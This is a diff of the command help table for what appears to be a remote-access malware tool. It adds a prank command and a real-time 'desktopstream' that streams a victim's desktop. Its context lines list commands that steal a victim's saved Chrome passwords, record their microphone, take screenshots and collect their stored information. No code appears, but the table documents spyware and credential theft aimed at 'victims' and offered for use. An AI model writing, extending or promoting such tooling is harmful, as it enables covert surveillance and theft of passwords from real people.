@@ -50,6 +50,7 @@ commands:
 ##troll_________________________________________________________________________________________
 | skull          | skull                            | spam cmd with skull and crossbones        |
 | msg            | msg <title> <line1> <line2>      | create alertbox with desired infos        |
+| rickroll       | rickroll                         | rockroll your victim ;)                   |
 
 ##stealing______________________________________________________________________________________
 | stealpasswords | stealpasswords                   | steal all victim's chrome saved passwords |
@@ -57,8 +58,9 @@ commands:
 
 ##spy___________________________________________________________________________________________
 | recordmicro    | recordmicro <time in second>     | record victim's micro for 'time'seconds   |
-| recordscreen   | recordscreen <time in second>    | record victim's screen for 'time'seconds  |
-| screenshot     | screenshot                       | take screenshot (located at )  |
+| desktopstream  | desktopstream                    | stream in real time victim's desktop      |
+| screenshot     | screenshot                       | take screenshot                           |
+|                |                                  | (located in the victim's website)         |
 | info           | info                             | get all stored victim's infos             |
 
 ##evil__________________________________________________________________________________________
